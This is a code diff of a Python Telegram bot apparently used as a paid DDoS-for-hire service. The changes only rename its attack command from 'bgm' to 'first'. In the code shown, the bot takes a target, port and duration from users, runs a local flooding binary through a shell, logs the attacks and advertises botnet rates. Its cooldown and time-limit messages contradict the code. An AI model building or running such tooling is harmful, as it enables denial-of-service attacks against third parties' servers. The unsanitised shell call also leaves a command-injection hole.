@@ -1,4 +1,4 @@
-#bgmddoserpython
+#firstddoserpython
 
 import telebot
 import subprocess
@@ -199,33 +199,33 @@ def show_user_id(message):
     response = f"🤖Your ID: {user_id}"
     bot.reply_to(message, response)
 
-# Function to handle the reply when free users run the /bgm command
+# Function to handle the reply when free users run the /first command
 def start_attack_reply(message, target, port, time):
     user_info = message.from_user
     username = user_info.username if user_info.username else user_info.first_name
     
-    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: bgm"
+    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: first"
     bot.reply_to(message, response)
 
-# Dictionary to store the last time each user ran the /bgm command
-bgm_cooldown = {}
+# Dictionary to store the last time each user ran the /first command
+first_cooldown = {}
 
 COOLDOWN_TIME =0
 
-# Handler for /bgm command
-@bot.message_handler(commands=['bgm'])
-def handle_bgm(message):
+# Handler for /first command
+@bot.message_handler(commands=['first'])
+def handle_first(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in bgm_cooldown and (datetime.datetime.now() - bgm_cooldown[user_id]).seconds < 3:
-                response = "You Are On Cooldown . Please Wait 5min Before Running The /bgm Command Again."
+            if user_id in first_cooldown and (datetime.datetime.now() - first_cooldown[user_id]).seconds < 3:
+                response = "You Are On Cooldown . Please Wait 5min Before Running The /first Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
-            bgm_cooldown[user_id] = datetime.datetime.now()
+            first_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
         if len(command) == 4:  # Updated to accept target, time, and port
@@ -235,14 +235,14 @@ def handle_bgm(message):
             if time > 581:
                 response = "Error: Time interval must be less than 80."
             else:
-                record_command_logs(user_id, '/bgm', target, port, time)
+                record_command_logs(user_id, '/first', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgm {target} {port} {time} 200"
+                full_command = f"./first {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
-                response = f"bgm Attack Finished. Target: {target} Port: {port} Port: {time}"
+                response = f"first Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
-            response = "✅ Usage :- /bgm <target> <port> <time>"  # Updated command syntax
+            response = "✅ Usage :- /first <target> <port> <time>"  # Updated command syntax
     else:
         response = " You Are Not Authorized To Use This Command ."
 
@@ -250,7 +250,7 @@ def handle_bgm(message):
 
 
 
-# Add /mylogs command to display logs recorded for bgm and website commands
+# Add /mylogs command to display logs recorded for first and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -274,7 +274,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /bgm : Method For bgm Servers. 
+💥 /first : Method For first Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
